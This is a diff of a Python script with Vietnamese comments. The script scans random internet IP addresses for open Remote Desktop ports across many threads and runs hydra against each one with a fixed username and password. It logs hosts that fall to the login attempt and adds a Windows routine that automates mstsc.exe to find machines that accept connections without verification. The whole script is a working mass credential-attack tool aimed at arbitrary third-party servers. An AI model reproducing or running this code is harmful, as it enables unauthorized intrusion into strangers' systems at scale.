@@ -1,3 +1,4 @@
+from pywinauto.application import Application
 import threading
 import random
 import socket
@@ -6,9 +7,26 @@ import os
 import platform
 
 system_name = platform.system()
-log = []
 
 class ScaningIP:
+    def __init__(self, port=3389, path="server.txt", thread_num=1000, user="Aaron", password="123456"):
+        self.port = port
+        self.path = path
+        self.thread_num = thread_num
+        self.user = user
+        self.password = password
+
+
+    # hàm tấn công
+    def attack(self, ip):
+        rdp_result = os.popen(f"hydra -t 1 -l {self.user} -p {self.password} rdp://{ip}").read()
+        rdp_result = int(rdp_result.split("completed, ")[1].split(" valid password")[0])
+        if rdp_result == 1:
+            return True
+        else:
+            return False
+
+    # dò ip rdp
     def random_ip(self):
         g1 = str(random.choice([i for i in range(253)]))
         g2 = str(random.choice([i for i in range(253)]))
@@ -16,60 +34,88 @@ class ScaningIP:
         g4 = str(random.choice([i for i in range(253)]))
         return f"{g1}.{g2}.{g3}.{g4}"
 
-    def check_rdps(self, hostname, port=3389):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2)
-            result = s.connect_ex((hostname, port))
-            if result == 0:
-                result = "open"
-            else:
-                result = "closed"
-            s.close()
-        except Exception as e:
-            pass
-        return result
-
-
-    def scan(self, user="Aaron", passw="12345"):
-        ip = self.random_ip()
-        if ip in log:
-            return
-        check_rdp = None
-        try:
-            check_rdp = self.check_rdps(hostname=ip)
-        except:
-            return "error"
-        if check_rdp in "open":
-            print(f"Địa chỉ : {ip}  Trạng thái RDP : {check_rdp}")
-            result = os.popen(f"hydra -t 1 -l {user} -p {passw} rdp://{ip}").read()
-            result = int(result.split("completed, ")[1].split(" valid password")[0])
-            if result == 1:
-                print("Một máy chủ đã gục ngã vào giỏ :>")
-                with open("server.txt", "a", encoding="utf-8") as file:
-                    log.append(ip)
-                    file.write(f"Địa chỉ : {ip}  Trạng thái RDP : {check_rdp} MK: {passw} USER: {user}\n")
-    
-    def scan_rdp_ip(self, th=10000, user="Aaron", passw="12345"):
+    def collect_rdp(self):
         while True:
-            threads = []
-            for i in range(th):
-                t = threading.Thread(target=self.scan, args=(user, passw))
-                threads.append(t)
-                time.sleep(0.01)
-                t.start()
-            for t in threads:
-                t.join()
+            ip = self.random_ip()
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1)
+                check_result = s.connect_ex((ip, self.port))
+                if check_result == 0:
+                    print(f"IP: {ip} Trạng thái: Mở")
 
-thread_num = input("nhập số luồng mặc định 10000, gõ d để chọn mặc định hoặc nhập số lượng : ").strip()
-if thread_num in "d":
-    thread_num = 10000
-else:
-    thread_num = int(thread_num)
-user = input("nhập user, mặc định là Aaron gõ d để chọn mặc định hoặc nhập user : ").strip()
-if user in "d":
-    user = "Aaron"
-passw = input("nhập password, mặc định là 12345 gõ d để chọn mặc định hoặc nhập pass : ").strip()
-if passw in "d":
-    passw = "12345"
-ScaningIP().scan_rdp_ip()
+                    # tấn công
+                    attack_result = self.attack(ip=ip)
+                    if attack_result == True:
+                        print("tấn công thành công")
+                        with open(self.path, mode="a", encoding="utf-8") as file:
+                             file.write(ip)
+                    else:
+                        print("tấn công không thành công")
+
+                s.close()
+            except Exception as e:
+                pass
+
+    def scan_ip(self):
+        threads = []
+        for _ in range(self.thread_num):
+            time.sleep(0.01)
+            scan = threading.Thread(target=self.collect_rdp)
+            threads.append(scan)
+            scan.start()
+        for thread in threads:
+            thread.join()
+
+    # lọc ra các ip rdp không có mật khẩu
+    def filter_non_verify_ip(self):
+        with open(self.path, mode="r", encoding="utf-8") as file:
+            IPs = file.read().splitlines()
+        
+        rdp_path = "mstsc.exe"
+        app = Application(backend="uia").start(rdp_path)
+        for ip in IPs:
+            window = app.window(title="Remote Desktop Connection")
+            write_ip = window.child_window(title="Computer:", control_type="Edit").wrapper_object()
+            write_ip.type_keys(ip.strip())
+            connect = window.child_window(title="Connect", control_type="Button").wrapper_object()
+            connect.click()
+            try:
+                check_connect = window.child_window(title="Yes")
+                if check_connect.is_visible():
+                    print("Đây không phải là một VPS hợp lệ.")
+                    close = window.child_window(title="No", control_type="Button")
+                    close.click()
+                    continue
+            except:
+                input("Đã tìm thấy, vui lòng nhập pass và user để thử. sau đó enter để tiếp tục : ")
+                app.kill()
+                app = Application(backend="uia").start(rdp_path)
+                continue
+        
+    def filtered(self):
+        while True:
+            try:
+                self.filter_non_verify_ip()
+            except:
+                continue
+
+def command_line():
+    def attack():
+        thread_num = int(input("nhập số luồng : "))
+        user = input('nhập user, nếu không mặc định là Aaron, nhấn "d" để mặc định: ').strip()
+        if user in "d":
+            pass
+        password = input('nhập password, mặc định là 12345, nhấn "d" để mặc định : ').strip()
+        if password in "d":
+            pass
+        ScaningIP(thread_num=thread_num, user="Aaron", password="12345").scan_ip()
+    def filter():
+        ScaningIP().filtered()
+    
+    inp = input("1 - attack (only linux)\n2 - lọc ip (only window) * chắc rằng tệp có IPs\nhãy chọn lựa trọn trên : ").strip()
+    if inp in "1":
+        attack()
+    else:
+        filter()
+command_line()
